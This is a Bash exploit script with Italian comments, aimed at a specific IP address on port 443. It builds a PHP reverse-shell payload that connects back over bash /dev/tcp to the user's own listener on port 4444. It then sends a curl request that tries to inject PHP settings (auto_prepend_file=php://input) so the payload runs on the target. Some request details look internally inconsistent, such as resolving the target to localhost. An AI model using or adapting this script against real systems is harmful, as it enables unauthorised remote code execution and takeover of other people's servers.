#!/bin/bash
TARGET_IP="14.225.209.143"
TARGET_PORT="443"
MY_IP=$(curl -s ifconfig.me)
RPORT=4444

echo "🔥 TARGET: https://${TARGET_IP}:${TARGET_PORT}"
echo "🔥 Listener: ${MY_IP}:${RPORT}"

# ✅ PAYLOAD SEMPLICE E FUNZIONANTE (reverse shell puro)
PHP_PAYLOAD="<?php system('bash -c \"bash -i >& /dev/tcp/${MY_IP}/${RPORT} 0>&1\"'); ?>"

# 1. START NC IN FOREGROUND (senza pipe rotti)
echo "[+] Avvia listener manualmente: nc -lvnp ${RPORT}"
echo "[+] Poi premi INVIO qui per exploit..."
read

# 2. EXPLOIT PULITO (singolo base64 corretto)
curl -k -s \
  -H "User-Agent: Mozilla/5.0" \
  -H "X-Forwarded-For: 127.0.0.1" \
  --resolve "${TARGET_IP}:${TARGET_PORT}:127.0.0.1" \
  --data-urlencode "X_DEBUG_SESSION_START=1" \
  --data-urlencode "-d@allow_url_include=1" \
  --data-urlencode "-d@auto_prepend_file=php://input" \
  --data-binary "${PHP_PAYLOAD}" \
  "https://${TARGET_IP}:${TARGET_PORT}/" \
  >/dev/null 2>&1 &

echo "🎉 SHELL SU ${MY_IP}:${RPORT} tra 3 secondi!"
